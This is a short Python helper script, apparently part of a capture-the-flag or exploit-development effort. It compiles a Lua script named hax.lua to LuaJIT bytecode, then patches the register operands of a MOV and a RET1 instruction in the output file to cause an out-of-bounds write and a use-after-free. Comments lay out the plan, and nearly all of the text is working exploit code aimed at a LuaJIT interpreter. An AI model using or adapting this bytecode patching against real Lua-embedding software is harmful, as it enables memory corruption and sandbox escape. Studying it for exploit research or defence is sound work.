#!/usr/bin/env python3
import os
# helper script
# > hot-patching a single `MOV` instruction to prep for UAF
# > (in between, our `hax.lua` script will call `collectgarbage()` to achieve UAF) 
# > Then, we `RET` the free'd value

INPUT_FILE = './hax.lua'
OUT_FILE = './hacktheplanet.lua'

with open(INPUT_FILE, 'r') as f:
  script = f.read()
 
os.system(f'luajit -b {INPUT_FILE} {OUT_FILE}')

with open(OUT_FILE, 'r+b') as f:
    hotpatch = f.read()
    hotpatch = hotpatch.replace(b'\x12\x03\x02', b'\x12\x42\x02', 1) # replace 'MOV 2, 1' with 'MOV 66, 1' to create OOB write
    hotpatch = hotpatch.replace(b'\x4c\x04\x02', b'\x4c\x42\x02', 1) # replace 'RET1 3, 2' with 'RET1 66, 2' to achieve UAF
    f.seek(0)
    f.write(hotpatch)

# debug purposes 
# os.system(f'./luajit -bl {OUT_FILE}')
